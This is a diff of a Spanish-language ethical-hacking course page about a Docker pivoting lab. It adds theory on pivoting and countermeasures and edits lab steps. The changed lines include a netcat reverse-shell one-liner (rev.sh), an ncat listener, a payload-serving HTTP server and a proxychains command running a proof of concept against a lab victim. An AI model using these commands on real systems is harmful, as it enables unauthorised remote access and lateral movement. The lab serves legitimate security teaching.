@@ -4,6 +4,48 @@ title: Laboratorio de pivoting en Docker
 description: Pivoting, Docker, movimiento lateral, túnel SSH, proxychains. Pentesting, hacking, AD. Apuntes, teoría, prácticas, ejercicio del curso de especialización de ciberseguridad. IES severo ochoa Elche. Hacking ético. incidentes de seguridad, puesta en producción segura.
 ---
 
+# Un poco de teoría
+En ciberseguridad, el pivoting es una técnica utilizada por atacantes para moverse lateralmente dentro de una red comprometida, utilizando un sistema previamente comprometido como punto de apoyo o "puente" para acceder a otros sistemas o recursos que de otro modo no serían accesibles directamente desde el exterior.
+
+El pivoting se usa comúnmente después de obtener acceso inicial a una red y es una parte clave en la fase de post-explotación de un ataque. El objetivo principal es maximizar el alcance y obtener más información o acceso a sistemas de alto valor.
+Tipos de Pivoting
+
++ **Pivoting de red:** Consiste en redirigir el tráfico de una herramienta o servicio hacia una red interna a través de una máquina comprometida. Esto permite al atacante escanear o interactuar con máquinas que solo son accesibles desde la red interna.
+
+    + <u>Ejemplo:</u> Un atacante compromete un servidor web DMZ que está conectado a una red interna. Desde este servidor, redirige el tráfico a otros servidores internos para realizar reconocimiento o ataques adicionales.
+
++ **Pivoting de archivo/sesión:** Utiliza credenciales o tokens robados en un sistema comprometido para autenticar y moverse a otros sistemas sin necesidad de redireccionar el tráfico de red.
+
+    + <u>Ejemplo:</u> Un atacante obtiene credenciales válidas en un servidor de base de datos a través de un servidor comprometido y las utiliza para acceder a otros sistemas dentro de la misma red.
+
+### Ejemplos Prácticos
+
+  + ***Mediante herramientas de pentesting:***
+      + **Metasploit:** El atacante usa un exploit para comprometer un sistema, establece un meterpreter session, y configura un proxy o túnel para escanear y atacar otros dispositivos internos.
+      + **ProxyChains:** Se configura un túnel para ejecutar herramientas externas (como nmap o sqlmap) a través del sistema comprometido.
+
+  + ***Ataques de Active Directory:*** Un atacante compromete un dispositivo de usuario final, roba credenciales y las usa para moverse lateralmente hacia un controlador de dominio u otros servidores críticos.
+
+  + ***VPN y túneles inversos:*** El atacante establece un túnel SSH o usa herramientas como chisel o frp para crear una conexión desde el sistema comprometido hacia su máquina atacante, permitiéndole acceso continuo a la red interna.
+
+  + ***Ataque a segmentación de red:*** En una red segmentada, el atacante usa un servidor comprometido como pivote para acceder a otras subredes. Por ejemplo, compromete un servidor en la VLAN de administración y desde allí accede a servidores de producción.
+
+## Contramedidas para Evitar el Pivoting
+
+  + **Segmentación de red y VLAN:** Asegurar que las subredes estén correctamente segmentadas y que solo los sistemas autorizados puedan comunicarse entre ellas.
+
+  + M**onitorización de tráfico:** Detectar conexiones inusuales desde servidores comprometidos hacia otras partes de la red interna.
+
+  + **Políticas de privilegios mínimos:** Asegurarse de que los usuarios y servicios tengan acceso solo a lo estrictamente necesario.
+
+  + **Uso de EDR/NDR:** Implementar soluciones que detecten movimientos laterales y actividades de red sospechosas.
+
+  + **Parcheo de sistemas:** Mantener los sistemas actualizados para reducir las vulnerabilidades explotables que permiten establecer puntos de pivote.
+
+
+
+
+
 # Pivoting
 
 El pivoting hace referencia a una técnica donde tras comprometer un equipo, nos damos cuenta de que éste nos da acceso a otros equipos o redes a los que de una forma directa no podríamos acceder. Así pues, nuestra máquina comprometida o máquina de salto nos sirve para seguir obteniendo nuevos accesos.
@@ -162,7 +204,7 @@ Para este contenedor se ha habilitado el login de root mediante SSH, algo poco r
 La sentencia `extra_hosts`añade una entrada en el archivo `/etc/hosts` del contenedor para que de esta forma podamos utilizar su nombre, en lugar de la IP, para comunicarnos:
 
 ```Dockerfile
-ROM phusion/baseimage:jammy-1.0.1
+FROM phusion/baseimage:jammy-1.0.1
 
 RUN apt update -y \
     && apt install -y \
@@ -368,7 +410,7 @@ Para vulnerar la máquina **victim2**, vamos a hacer uso de dos elementos:
   
     ```bash title="rev.sh"
     #!/bin/bash
-    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 172.16.101.11 8500 >/tmp/f    
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 172.16.101.11 9000 >/tmp/f    
     ```
 
 2. Este código como POC (*proof of concept* o prueba de concepto)
@@ -434,7 +476,7 @@ Aquí necesitamos utilizar el concepto de de **remote port forwarding**. Con est
     Consulta [este](https://cyberblog.es/index.php/2023/03/19/ssh-tunneling-local-remote-port-forwarding/) link o cualquier otro que te sea necesario para entender el concepto de remote port forwarding y ser capaz de completar el siguiente comando, que deberá ser ejecutado en **attacker**:
     
       ```bash
-      ssh ___ :___:172.16.100.10:___ root@helper -N -f
+      ssh ___ :___:172.16.100.10:___ root@helper __ __
       ```
 
 !!!task "Tarea"
@@ -445,9 +487,9 @@ Ahora sólo estamos a un pequeñísimo paso de conseguir nuestra shell inversa. 
 !!!task "Tarea"
     Documenta los pasos a seguir con la nueva redirección de puertos y el éxito comprometiendo esta nueva máquina. Elabora un diagrama en [https://app.diagrams.net/](https://app.diagrams.net/) donde se vea el proceso:
 
-      1. `ssh __ :__:172.16.100.10:__ -R :__:172.16.100.10:__ root@helper -N -f`
+      1. `ssh __ :__:172.16.100.10:__ __ :__:172.16.100.10:__ root@helper -N -f`
       2. `python3 -m http.server 80`
-      4. `ncat -lvnp 1331`
+      4. `ncat -lvnp 9000`
       3. `proxychains4 -q ./poc.sh 172.16.101.21`
 
 #  Cuestión
